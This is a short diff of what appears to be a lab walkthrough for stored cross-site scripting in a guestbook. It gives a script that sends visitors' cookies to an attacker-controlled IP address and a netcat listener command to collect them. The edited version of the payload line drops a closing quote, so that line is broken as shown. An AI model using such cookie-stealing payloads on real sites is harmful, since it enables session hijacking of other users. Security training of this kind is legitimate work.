@@ -32,7 +32,7 @@ or alert window.
 To steal other user cookies: 
 Navigate to XSS stored and type below script in message. Before that increase the size of message textbox. 
 <script>new 
-Image().src=”http://192.168.45.136/abc.php?output=”+document.cookie;</script> And 
+Image().src="http://192.168.45.136/abc.php?output=+document.cookie;</script> And 
 press Sign Guestbook. 
 Keep the listener ready in terminal by using below 
 command  𝑛𝑐 − 𝑙𝑣𝑝  80
